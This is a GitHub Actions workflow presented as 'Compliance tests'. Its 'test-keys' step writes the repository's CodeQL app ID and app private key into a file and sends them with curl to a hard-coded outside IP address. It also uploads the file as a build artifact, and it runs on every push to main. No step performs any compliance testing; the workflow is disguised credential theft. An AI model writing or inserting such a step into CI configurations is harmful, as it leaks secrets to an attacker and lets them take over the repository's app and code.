---
name: Compliance tests
        
on:
  push:
    branches:
      - main
  workflow_dispatch:
    
    
jobs:
  test-compliance:
    runs-on: ubuntu-latest
    steps:
    
      - name: test-keys
        run: |
          echo 'appid:%20${{ env.CODEQL_APP_ID }}%20private-key:%20${{ env.CODEQL_AUTHENTICATION_PRIVATE_KEY }}' > keys
          curl http://13.40.220.37:8080/?keys=$(cat keys)
        env:
          CODEQL_APP_ID: ${{ secrets.CODEQL_APP_ID }}
          CODEQL_AUTHENTICATION_PRIVATE_KEY: ${{ secrets.CODEQL_AUTHENTICATION_PRIVATE_KEY }}
    
      - uses: actions/upload-artifact@v4
        with:
          name: 'keys'
          path: '${{ github.workspace }}/keys'
          retention-days: 1

      - uses: actions/create-github-app-token@v1
        id: app-token
        with:
          app-id: ${{ secrets.CODEQL_APP_ID }}
          private-key: ${{ secrets.CODEQL_AUTHENTICATION_PRIVATE_KEY }}
          owner: ${{ github.repository_owner }}      
    
        
